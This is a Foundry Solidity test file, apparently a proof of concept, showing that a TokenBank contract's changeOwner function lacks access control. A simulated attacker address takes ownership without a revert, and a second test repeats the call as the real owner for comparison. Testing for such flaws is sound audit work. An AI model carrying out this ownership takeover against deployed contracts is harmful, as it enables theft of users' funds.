// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/0x627fa62ccbb1c1b04ffaecd72a53e37fc0e17839.sol";

contract TokenTest is Test {
    TokenBank tokenBank;
    address owner = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.startPrank(owner);
        tokenBank = new TokenBank();
        vm.stopPrank();
    }

    function testUnauthorizedChangeOwner() public {
        console.log("--- BEFORE-Trigger ---");
        console.log("Expecting: Unauthorized changeOwner call should revert");
        
        console.log("--- Trigger: Attacker calls changeOwner ---");
        vm.prank(attacker);
        tokenBank.changeOwner(attacker);  // Vulnerable call - no access control
        
        console.log("--- AFTER-Trigger ---");
        console.log("Verification: Unauthorized call completed without revert");
        console.log("Vulnerability Exists: changeOwner lacks access control, allowing any address to trigger ownership change");
    }

    function testAuthorizedChangeOwner() public {
        console.log("--- BEFORE-Trigger ---");
        console.log("Authorized owner calls changeOwner (expected behavior)");
        
        console.log("--- Trigger: Owner calls changeOwner ---");
        vm.prank(owner);
        tokenBank.changeOwner(attacker); // Valid authorized call
        
        console.log("--- AFTER-Trigger ---");
        console.log("Authorized call completed without revert (expected)");
    }
}